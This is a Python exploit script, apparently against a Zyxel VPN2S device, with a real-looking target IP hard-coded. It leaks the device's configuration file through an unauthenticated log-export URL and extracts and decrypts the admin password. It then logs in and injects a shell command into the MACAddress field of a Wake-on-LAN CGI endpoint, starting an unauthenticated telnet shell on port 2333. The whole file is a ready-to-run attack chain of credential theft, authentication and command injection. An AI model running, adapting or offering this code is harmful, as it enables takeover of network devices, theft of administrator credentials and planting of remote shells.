import requests
import json

from decrypt import decrypt_key

######  config  start ######
server = "151.49.225.55"
port = 8443
username = "admin"
password = ""
######  config  end   ######

if port == 80:
    main_url = "http://"+server
elif port == 443:
    main_url = "https://" + server
else:
    main_url = "https://" + server + ":" + str(port)

def leak_config_file():
    url = main_url + "/Export_Log?/data/zcfg_config.json"
    s = requests.Session()
    with open(f"zcfg_config-{server}.json", "w") as f:
        res = s.get(url, verify=False).json()
        json.dump(res, f, indent=4)
        print(f"[+] Config file saved as zcfg_config-{server}.json")
    with open(f"zcfg_config-{server}.json", "r") as f:
        data = json.load(f)
        for item in data["X_ZYXEL_LoginCfg"]["LogGp"]:
            if item["Page"] != "" and item["Account"] != []:
                user = item["Account"][0]["Username"]
                encrypted_password = item["Account"][0]["Password"]
                print(f"[+] User: {user}")
                print(f"[+] Encrypted Password: {encrypted_password}")
                return user, encrypted_password

def decrypt_password(encrypt_password):
    password = decrypt_key(encrypt_password)
    end_index = password.index('\0')
    return password[:end_index]

def login():
    headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
            "Cookie": "frun=0; model=VPN2S; hname=[; webcolor=blue; Authentication=; login=admin",
            }
    s = requests.Session()
    url = main_url + "/init"
    print(f"login with {username}, {password}")
    data = {
            "username": username,
            "pwd": password,
            "pwd_r": "",
            "password": password,
            "loginTosslvpn": "false"
            }
    print(f"data: {data}")
    r = s.post(url, headers=headers, data=data, timeout=100, verify=False)
    print(f"response: {r.status_code}, {r.text}")
    return r.headers
    
def get_authentication_key (headers):
    auth = headers["Set-Cookie"].split(";")[0].split("=")[1]
    return auth

def exp(auth):
    headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
            "Cookie": "frun=0; model=VPN2S; hname=[; webcolor=blue; login=admin; Authentication=" + auth,
            }
    s = requests.Session()

    url = main_url + "/cgi-bin/WOLCmdExe"
    cmd = 'systemctl stop telnet.socket;telnetd -l /bin/sh 2333'
    data = {
        'url': '/cgi-bin/WOLCmdExe',
        'MACAddress': f';{cmd};'
    }
    print(f"payload: {json.dumps(data, indent=4)}")
    r = s.post(url, headers=headers, json=data, timeout=100, verify=False)
    print(r.text)

print("\n[*] Connection ", main_url)
print("[*] Leak Config File")
username, encrypted_password = leak_config_file()
print("[*] Decrypt Admin Password")
password = decrypt_password(encrypted_password.replace("_encrypt_", ""))
print("[*] Login")
headers = login()
print("[*] Get Authentication Key")
auth = get_authentication_key(headers)
print(auth) 
print("[*] Exploiting")
exp(auth)